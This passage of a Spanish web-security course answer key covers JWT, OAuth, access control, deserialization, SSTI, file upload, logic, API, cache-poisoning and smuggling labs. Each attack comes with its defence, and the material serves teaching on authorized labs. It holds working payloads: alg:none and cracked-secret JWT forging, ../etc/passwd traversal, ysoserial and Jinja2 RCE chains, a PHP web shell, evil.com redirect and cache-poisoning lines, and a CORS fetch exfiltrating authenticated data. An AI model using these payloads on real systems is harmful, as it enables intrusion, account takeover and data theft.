4. Comprueba expiración por inactividad (idle timeout) y absoluta (aunque haya actividad); una sesión debería caducar por ambas.
5. El logout debe invalidar el token en el servidor (borrarlo del store); borrar solo la cookie del cliente deja el token válido y reutilizable si alguien lo capturó.
6. Cookie ideal bancaria: `Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age corto`, ID de ≥128 bits, rotación en login y timeout de inactividad breve.

---

## Clase 103 — Ataques y seguridad de JWT

### Solución del reto verificable

Objetivo: lab JWT de PortSwigger (alg:none, clave débil o confusión) escalando a admin.

Pasos:

1. Decodifica el JWT (header.payload.signature) con jwt_tool o la extensión de Burp.
2. Según el lab:
   - **alg:none**: cambia el header a `{"alg":"none"}`, edita `"role":"admin"` (o `sub:administrator`) y elimina la firma.
   - **Clave débil (HS256)**: crackea el secreto con hashcat `-m 16500` + wordlist, luego firma un token admin.
   - **Confusión RS256→HS256**: firma con HS256 usando la clave pública como secreto.
3. Envía el token forjado y accede a la función admin.

Evidencia que cumple el criterio: lab resuelto, el token forjado, el ataque usado y la corrección (verificar firma, fijar el `alg` esperado en servidor, secreto fuerte, no aceptar `none`).

### Claves de los ejercicios

1. Header (alg/typ), Payload (claims: sub, role, exp, iss, aud), Signature (firma sobre header.payload). El payload lleva las afirmaciones, va en Base64URL (no cifrado).
2. alg:none: header `{"alg":"none"}`, sin firma; si el server lo acepta, cualquier payload es válido.
3. RS256→HS256: el server usa la clave pública (conocida) para verificar; si acepta HS256, firmas con esa pública como secreto HMAC y pasa la verificación.
4. Secreto HMAC débil: `hashcat -m 16500 token.txt rockyou.txt`; con el secreto, forjas cualquier token.
5. `exp` (expiración), `iss` (emisor), `aud` (audiencia): si no se validan, un token caducado o de otro servicio/audiencia se acepta indebidamente.
6. Validación correcta: fijar el algoritmo esperado (no leerlo del token), verificar firma con la clave correcta, y comprobar exp/iss/aud.

---

## Clase 104 — Seguridad de OAuth 2.0 y OpenID Connect

### Solución del reto verificable

Objetivo: lab OAuth de PortSwigger (redirect_uri débil o falta de state) para tomar la cuenta de otro usuario.

Pasos:

1. Intercepta el flujo de autorización y localiza `redirect_uri` y `state`.
2. **redirect_uri débil**: si valida por prefijo/subcadena, redirige el código a un dominio que controlas (`https://legit.com.attacker.com` o `.../callback/../evil`), capturando el `code`/token de la víctima.
3. **Falta de state**: monta un CSRF sobre el callback para enlazar tu cuenta social a la sesión de la víctima (o viceversa), tomando control.
4. Usa el código/token robado para autenticarte como la víctima.

Evidencia que cumple el criterio: lab resuelto, el flujo interceptado, el parámetro abusado y la defensa (allowlist exacta de redirect_uri, `state` obligatorio y verificado, PKCE).

### Claves de los ejercicios

1. Authorization Code + PKCE: cliente genera `code_verifier`→`code_challenge`; `/authorize?response_type=code&client_id&redirect_uri&scope&state&code_challenge&code_challenge_method=S256`; usuario consiente; vuelve `code`; cliente hace `/token` con `code`+`code_verifier`; recibe tokens.
2. Validación por prefijo: `redirect_uri=https://app.com.evil.com` pasa un `startsWith("https://app.com")` ingenuo; por eso hay que comparar la URL exacta.
3. Falta de state: sin `state`, el atacante fuerza el callback y asocia su identidad social a la sesión de la víctima → account hijacking (login CSRF).
4. `access_token` (acceso a recursos/API), `id_token` (identidad, OIDC, JWT con claims del usuario), `refresh_token` (obtener nuevos access tokens sin re-login).
5. PKCE protege el `code` en clientes públicos (SPA/móvil) donde no hay client secret: aunque roben el `code`, sin el `code_verifier` no lo canjean. Imprescindible en clientes públicos.
6. Validación estricta de redirect_uri: allowlist con **coincidencia exacta** de URIs registradas (esquema+host+path), sin comodines ni comparación por prefijo.

---

## Clase 105 — Control de acceso roto: IDOR y path traversal

### Solución del reto verificable

Objetivo: resolver un IDOR (datos de otro usuario) y un path traversal (leer archivo del sistema) en PortSwigger.

Pasos (IDOR):

1. Localiza un identificador manipulable (`/account?id=124`, `/download?docId=...`).
2. Cámbialo por el de otro usuario y observa el acceso no autorizado.

Pasos (path traversal):

1. En un parámetro de archivo (`?filename=image.jpg`) inyecta `../../../../etc/passwd`.
2. Si filtra `../`, prueba codificación (`%2e%2e%2f`), doble codificación o `....//`.

Evidencia que cumple el criterio: ambos labs resueltos, el identificador/ruta manipulados, la evidencia del acceso no autorizado y la defensa (authz por objeto comprobando propietario, canonicalización y validación de rutas).

### Claves de los ejercicios

1. IDOR horizontal: acceder a datos de otro usuario del mismo nivel (tu factura vs. la de otro). Escalada vertical: acceder a funciones de mayor privilegio (usuario→admin).
2. IDOR con UUID: el UUID no es secreto si se filtra en otra respuesta (listados, logs, referencias); busca la fuente que lo expone y reúsalo.
3. Path traversal evadiendo filtro de `../`: `..%2f`, `..%252f` (doble), o `....//` (que tras eliminar `../` deja `../`).
4. Forced browsing: navega directamente a `/admin` o `/admin/deleteUser` aunque no haya enlace; si carga, falta control de función.
5. Cambiar el verbo: si `GET /admin` está bloqueado, prueba `POST`/`PUT`; algunos controles solo cubren un método.
6. Control correcto: en cada acceso a objeto, comprobar en servidor que el recurso pertenece al usuario autenticado (`WHERE owner_id = session.user`), no confiar en el ID del cliente.

---

## Clase 106 — Deserialización insegura

### Solución del reto verificable

Objetivo: lab de deserialización de PortSwigger, primero manipulación de atributos y, si llegas, RCE con gadget chain.

Pasos (manipulación):

1. Decodifica el objeto serializado (cookie con objeto PHP/Java Base64).
2. Edita un atributo, p. ej. `admin` de `false` a `true` o cambia el `user`.
3. Reenvía y comprueba la escalada de privilegio.

Pasos (RCE): genera un payload con ysoserial (Java) usando una gadget chain presente en el classpath (p. ej. CommonsCollections) y envíalo al endpoint que deserializa.

Evidencia que cumple el criterio: al menos el lab de manipulación resuelto con evidencia del cambio de privilegio; documenta el formato serializado y por qué deserializar input no confiable es la causa raíz.

### Claves de los ejercicios

1. Objeto PHP serializado (`O:4:"User":2:{s:5:"admin";b:0;...}`): cambia `b:0` (false) por `b:1` (true) ajustando longitudes; escala privilegio.
2. Gadget chain: secuencia de clases cuyos magic methods, encadenados durante la deserialización, terminan ejecutando código; depende de qué librerías (gadgets) estén disponibles en el classpath.
3. `ysoserial CommonsCollections6 'command'` genera un objeto Java que, al deserializarse, ejecuta el comando vía esa cadena.
4. `pickle.loads` sobre datos externos ejecuta `__reduce__` de clases arbitrarias durante la deserialización → RCE directo; nunca deserializar pickle no confiable.
5. Magic methods: PHP `__wakeup`, `__destruct`, `__toString`; Java `readObject`; Python `__reduce__`, `__setstate__`. Se ejecutan automáticamente al deserializar.
6. Alternativas seguras: formatos de datos (JSON) con validación de esquema, no serializar objetos con estado ejecutable, y firmar/verificar integridad (HMAC) del blob si debe viajar.

---

## Clase 107 — Server-Side Template Injection (SSTI)

### Solución del reto verificable

Objetivo: lab SSTI de PortSwigger con fingerprint + RCE que ejecute un comando.

Pasos:

1. Detecta SSTI: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`; si devuelve `49`, hay evaluación server-side.
2. Fingerprint del motor con payloads discriminantes (`{{7*'7'}}` → `7777777` en Jinja2/Python, `49` en Twig).
3. En Jinja2, escala a RCE: `{{ ''.__class__.__mro__[1].__subclasses__() }}` → localiza `subprocess.Popen`/`os` y ejecuta el comando.
4. Lee un archivo o ejecuta el comando que pide el lab.

Evidencia que cumple el criterio: lab resuelto, motor identificado, la cadena de payloads y la defensa (sandbox del motor, separar datos de plantilla, usar motor logic-less).

### Claves de los ejercicios

1. `{{7*7}}` que devuelve `49` indica evaluación de plantilla; un reflejo simple mostraría literalmente `{{7*7}}`.
2. Fingerprint: `{{7*'7'}}` → `7777777` (Jinja2/Python), pero `49` (Twig/PHP). Otros: `#{7*7}` (Ruby/Slim), `${7*7}` (Freemarker/JSP).
3. Cadena Python: `''.__class__` (str) → `.__mro__` (jerarquía, `object`) → `.__subclasses__()` (todas las clases cargadas) → buscar una que dé acceso a `os`/`subprocess`.
4. SSTI vs XSS: `{{7*7}}` en SSTI se evalúa en el **servidor** (motor de plantillas → RCE); en XSS el sink es el navegador. Mismo payload visible, distinto lugar de ejecución.
5. tplmap automatiza detección/explotación; tras usarlo, reproduce a mano el payload que generó para entenderlo.
6. Arquitectura logic-less (Mustache/Handlebars sin helpers peligrosos): las plantillas no evalúan expresiones arbitrarias, eliminando el vector SSTI.

---

## Clase 108 — Vulnerabilidades en carga de archivos

### Solución del reto verificable

Objetivo: RCE subiendo una web shell en DVWA Medium o PortSwigger evadiendo ≥1 validación.

Pasos:

1. DVWA Medium valida `Content-Type`. Sube un `shell.php` interceptando la petición y cambiando el `Content-Type` a `image/jpeg`.
2. Si valida extensión, prueba `shell.php.jpg`, `shell.pHp`, o extensiones alternativas (`.phtml`, `.php5`).
3. Accede a la shell subida (`/hackable/uploads/shell.php?cmd=id`) y ejecuta un comando.
4. Corrige: allowlist de extensiones, renombrado aleatorio, validar magic bytes, y guardar fuera del webroot.

Evidencia que cumple el criterio: archivo subido, la validación evadida (Content-Type/extensión), evidencia de ejecución de comando y la corrección.

### Claves de los ejercicios

1. Extensiones que pueden ejecutar PHP: `.php`, `.php5`, `.phtml`, `.phar`, `.pht` (según config del servidor).
2. Evadir Content-Type: cambiarlo a `image/jpeg` en la petición. Evadir magic bytes: anteponer la firma `GIF89a;` o los bytes JPEG al inicio del archivo, seguido del código.
3. SVG con JS: `<svg xmlns="..."><script>alert(document.domain)</script></svg>`; si se sirve inline, es XSS almacenado.
4. `../` en el nombre: `../../shell.php` intenta escribir fuera del directorio de subida (path traversal en el upload).
5. Guardar fuera del webroot impide que el archivo subido sea accesible por URL y por tanto ejecutable por el servidor web, mitigando el RCE.
6. Validación robusta: allowlist de extensiones/MIME por magic bytes, renombrado aleatorio, límite de tamaño, almacenamiento fuera del webroot y escaneo AV.

---

## Clase 109 — Vulnerabilidades de lógica de negocio

### Solución del reto verificable

Objetivo: lab de lógica de negocio de PortSwigger (precio, flow bypass o race condition) demostrando el beneficio indebido.

Pasos:

1. **Manipulación de precio**: intercepta la petición de añadir al carrito/checkout y cambia el precio o la cantidad a un valor negativo/menor.
2. **Flow bypass**: salta un paso de validación accediendo directamente al endpoint final (p. ej. confirmar sin pagar).
3. **Race condition**: envía peticiones paralelas (Turbo Intruder, single-packet attack) para canjear un cupón/saldo varias veces antes de que se actualice el estado.

Evidencia que cumple el criterio: lab resuelto, la regla de negocio vulnerada, la petición manipulada/paralela y la defensa (validar y recalcular en servidor, idempotencia, bloqueos/locks).

### Claves de los ejercicios

1. Suposiciones rompibles en Juice Shop: "el precio viene del cliente", "solo se aplica un cupón", "el usuario sigue los pasos en orden".
2. Precio negativo: si el total se recalcula con una cantidad negativa, el saldo del usuario aumenta; impacto financiero directo.
3. Flow bypass: si el paso "verificar pago" solo se hace en el front, llama directamente a `POST /order/confirm` saltándolo.
4. Race condition de canje múltiple: envía N peticiones simultáneas de "aplicar cupón/gift card" antes de que se marque como usado; algunas se aplican varias veces.
5. Recalcular en servidor: el backend debe determinar el precio desde su BD, ignorando cualquier precio/total enviado por el cliente.
6. Validaciones de carrito: cantidades > 0 y con tope, precios del servidor, cupones idempotentes y de un solo uso con bloqueo transaccional.

---

## Clase 110 — Seguridad de APIs REST

### Solución del reto verificable

Objetivo: en crAPI (o VAmPI), lograr acceso a datos ajenos vía BOLA y una escalada por mass assignment.

Pasos:

1. **BOLA (IDOR de objeto)**: autentícate como un usuario y cambia el identificador de recurso en una petición (`GET /identity/api/v2/vehicle/{id}/location` o `/user/{id}`) por el de otro usuario; recibes sus datos.
2. **Mass assignment**: en un endpoint de creación/actualización (p. ej. registro o perfil), añade al JSON un campo no previsto como `"role":"admin"` o `"isAdmin":true`; si el backend lo bindea, escalas privilegio.
3. Documenta ambas peticiones y respuestas.

Evidencia que cumple el criterio: peticiones, evidencia de acceso no autorizado y de elevación de privilegio, y la defensa (comprobar propiedad del objeto, allowlist de campos aceptados, authz por función).

### Claves de los ejercicios

1. Agrupa endpoints de crAPI por sensibilidad: auth/login (3), perfil/vehículo (3), comunidad/foro (2), catálogo (1).
2. BOLA: cambia el ID de un recurso por el de otro usuario y obtén sus datos (documenta el dato obtenido).
3. Función sin control (BFLA): un endpoint admin accesible por un usuario normal (p. ej. `GET /admin/...`) → escálalo.
4. Exposición excesiva de datos: compara lo que muestra la UI con la respuesta cruda de la API; suele devolver campos de más (tokens, emails, flags internas).
5. Mass assignment: enviar `role`/`credit` extra en el body para elevarte (ver reto).
6. Authz correcta: por objeto (verificar propietario en cada acceso) y por función (verificar rol/permiso para cada operación), siempre en servidor.

---

## Clase 111 — Seguridad de APIs GraphQL

### Solución del reto verificable

Objetivo: en DVGA, obtener el esquema por introspección, explotar authz rota y demostrar bypass de rate limit con batching/alias.

Pasos:

1. **Introspección**: envía la query `__schema { types { name fields { name } } }` para reconstruir el esquema.
2. **Authz rota**: ejecuta una query/mutation que no debería estar permitida para tu rol (p. ej. leer datos privados de otro usuario o una mutation admin).
3. **Bypass de rate limit con alias/batching**: en una sola petición, usa alias para repetir la misma operación N veces:

```graphql
{ a: login(pw:"1"){ok} b: login(pw:"2"){ok} c: login(pw:"3"){ok} }
```

Evidencia que cumple el criterio: el esquema extraído, la operación no autorizada con evidencia y el batching que elude el límite, más la defensa (introspección off en prod, authz por resolver, límites de profundidad/complejidad, anti-batching).

### Claves de los ejercicios

1. Reconstruye el esquema con introspección (`__schema`); si está deshabilitada, con clairvoyance (infiere campos por mensajes de error de sugerencia).
2. IDOR en query: `user(id:2){email}` de otro usuario. En mutation: `updateUser(id:2, ...)` sobre otro.
3. Alias para fuerza bruta: varias invocaciones aliaseadas de la misma operación en una petición (ver reto).
4. Ataque de complejidad: query profundamente anidada (`posts{comments{author{posts{...}}}}`) que satura el resolver.
5. Desactivar introspección reduce el descubrimiento fácil del esquema, pero no elimina el riesgo: los campos siguen existiendo y se pueden inferir (clairvoyance) o adivinar.
6. Defensa: límites de profundidad y complejidad de consulta, coste por campo, authz **en cada resolver**, y desactivar introspección en producción.

---

## Clase 112 — Web cache poisoning y HTTP request smuggling

### Solución del reto verificable

Objetivo: resolver un lab de HTTP request smuggling (CL.TE o TE.CL) y uno de cache poisoning en PortSwigger.

Pasos (smuggling CL.TE):

1. Envía una petición con `Content-Length` y `Transfer-Encoding: chunked` en conflicto; el front usa CL y el back usa TE (o viceversa).
2. Contrabandea una petición prefijo que envenene la siguiente petición de otro usuario.

Pasos (cache poisoning):

1. Identifica una cabecera unkeyed (no forma parte de la cache key) que se refleje en la respuesta (p. ej. `X-Forwarded-Host`).
2. Envía una petición que inyecte un recurso malicioso; la respuesta envenenada se cachea y se sirve a otros.

Evidencia que cumple el criterio: ambos labs resueltos, las peticiones exactas (cabeceras conflictivas / input unkeyed), evidencia del impacto y la defensa (normalizar en el front, rechazar peticiones ambiguas, incluir cabeceras relevantes en la cache key).

### Claves de los ejercicios

1. La cache key suele componerse de método+host+path (+algunos params); si una cabecera reflejada queda fuera (unkeyed), una respuesta dependiente de ella se cachea y se sirve a todos.
2. Envenenar con cabecera unkeyed: `X-Forwarded-Host: evil.com` reflejada en un `<script src>` → la respuesta cacheada apunta al script del atacante.
3. CL.TE: el front respeta `Content-Length`, el back `Transfer-Encoding`. TE.CL: al revés. TE.TE: ambos soportan TE pero uno se puede ofuscar para que lo ignore.
4. Petición CL.TE a mano: `Content-Length` que abarca el cuerpo + `Transfer-Encoding: chunked` con un chunk `0` prematuro, dejando bytes "colgando" que prefijan la siguiente petición.
5. HTTP/2 end-to-end elimina la ambigüedad de longitud (usa framing binario con longitud explícita), quitando la base del smuggling clásico basado en desacuerdo CL/TE.
6. Defensa: normalizar/reescribir peticiones en el front, rechazar mensajes con CL y TE simultáneos o ambiguos, y usar HTTP/2 hasta el backend.

---

## Clase 113 — Ataques del lado del cliente: CORS, postMessage y prototype pollution

### Solución del reto verificable

Objetivo: resolver un lab de CORS (exfiltrar datos autenticados) y uno de prototype pollution que escale a XSS.

Pasos (CORS):

1. El server refleja el `Origin` y responde `Access-Control-Allow-Credentials: true`.
2. Desde tu página, `fetch('https://victima/account', {credentials:'include'})` y exfiltra la respuesta a tu servidor.

Pasos (prototype pollution):

1. Contamina `Object.prototype` desde un parámetro (`?__proto__[x]=y` o JSON `{"__proto__":{"x":"y"}}`).
2. Localiza un gadget que lea esa propiedad contaminada y la use en un sink (p. ej. una opción de config que acabe en `innerHTML` o `script src`) → XSS.

Evidencia que cumple el criterio: ambos labs resueltos, el exploit CORS con `credentials`, el source→gadget de la contaminación y las defensas por vector.

### Claves de los ejercicios

1. CORS que refleja Origin + credenciales: monta una página que hace `fetch(..., {credentials:'include'})` y roba la respuesta autenticada.
2. postMessage sin validar origen: un `window.addEventListener('message', e => eval(e.data))` sin comprobar `e.origin` permite que cualquier origen inyecte datos/código.
3. Contaminar `Object.prototype`: `obj.__proto__.polluted = true` o vía `?__proto__[polluted]=true`; comprueba con `({}).polluted`.
4. Gadget: propiedad contaminada que la app lee sin comprobar (p. ej. `config.transport_url` o `srcdoc`) y termina en un sink de HTML/script → XSS.
5. En Node, la prototype pollution puede llegar a RCE (contaminar opciones que afectan a `child_process`/require) o DoS; en el cliente típicamente escala a XSS.
6. Defensas: CORS con allowlist explícita de orígenes (no reflejar), validar `event.origin` en postMessage, y `Object.freeze(Object.prototype)` / usar `Map` en vez de objetos para datos externos.

---

## Clase 114 — Bug bounty: metodología y plataformas

### Solución del reto verificable

Objetivo: reporte de bug bounty completo y reproducible de una vulnerabilidad hallada en tu laboratorio, con CVSS y remediación.

Estructura del reporte:

1. **Título**: claro y específico (p. ej. "XSS almacenado en el campo de feedback permite ejecución de acciones como admin").
2. **Resumen / impacto de negocio**: qué gana el atacante y a quién afecta.
3. **Pasos de reproducción con PoC**: numerados, con la petición exacta y el payload; un tercero debe poder replicarlo solo con esto.
4. **CVSS**: vector y puntuación justificados.
5. **Remediación**: acción concreta (sanitizar salida, CSP, etc.).

Evidencia que cumple el criterio: reporte donde un tercero reproduce el bug siguiendo solo tus pasos; incluye título, impacto, PoC, CVSS justificado y remediación accionable.

### Claves de los ejercicios

1. Scope en 5 puntos: dominios in-scope, dominios/acciones out-of-scope, tipos de vuln aceptados, reglas de prueba (no DoS, no datos reales), y vía de reporte/recompensa.
2. Pipeline de recon: `subfinder -d target | httpx | katana` (crawl) + `ffuf` (dirbusting) + análisis de JS; solo sobre scope autorizado.
3. Prioriza por probabilidad × impacto: authz/IDOR (alta/alto), SQLi (media/crítico), XSS almacenado (media/alto), SSRF (baja/alto), info leak (alta/bajo).
4. Reporte de XSS almacenado de Juice Shop: título, impacto, pasos (campo, payload, dónde se dispara), PoC, CVSS, remediación (output encoding + CSP).
5. CVSS de ese XSS (ejemplo): `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` ≈ 6.x Medium; explica cada métrica (vector red, sin privilegios altos, requiere interacción, scope cambiado por afectar a otros).
6. Safe harbor: cláusula del programa que promete no emprender acciones legales contra investigadores que sigan las reglas; da cobertura legal para probar.

---

## Clase 115 — Secure coding y defensa de aplicaciones web

### Solución del reto verificable

Objetivo: corregir ≥3 vulnerabilidades de categorías distintas en una app vulnerable y verificar que el ataque original ya no funciona.

Pasos (ejemplo con 3 fallos):

1. **SQLi**: reemplaza la concatenación por prepared statements. Verifica que `' OR 1=1--` ya no altera la query.
2. **XSS**: aplica output encoding contextual y CSP. Verifica que el payload almacenado se muestra como texto.
3. **IDOR**: añade authz por objeto (`WHERE owner_id = session.user`). Verifica que cambiar el ID devuelve 403.

Evidencia que cumple el criterio: diff/código corregido de los 3 fallos, demostración de que el exploit previo falla tras el cambio, y el mapeo de cada corrección a su categoría OWASP (A03, A03, A01) y requisito ASVS (V5.3, V5.3, V4.2).

### Claves de los ejercicios

1. Query segura en dos lenguajes: PHP `$pdo->prepare('... WHERE id=?')->execute([$id])`; Python `cursor.execute('... WHERE id=%s',(id,))`. Nunca concatenar.
2. CSP para SPA con scripts propios: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'` (sin `unsafe-inline`, usar nonces si hace falta).
3. Cookie de sesión ideal: `Secure; HttpOnly; SameSite=Strict/Lax; Path=/; Max-Age corto`, ID de alta entropía; justificado por confidencialidad y anti-CSRF/anti-XSS-robo.
4. Corregir IDOR: comprobar en el endpoint que el objeto pertenece al usuario autenticado antes de devolverlo/modificarlo.
5. Validación con allowlist: aceptar solo el conjunto esperado (regex estricta, tipos, rangos) y rechazar todo lo demás, en el servidor.
6. Mapeo (ejemplo): parametrización→A03; output encoding→A03; CSP→A03/A05; authz por objeto→A01; MFA→A07; SCA→A06; cripto fuerte→A02; logging→A09; allowlist egress→A10; deserialización segura→A08.

---

> Fin de las soluciones de la Parte 4. Recuerda: el objetivo del laboratorio es entender la causa raíz y la defensa, no coleccionar exploits. Practica siempre sobre entornos propios o autorizados.
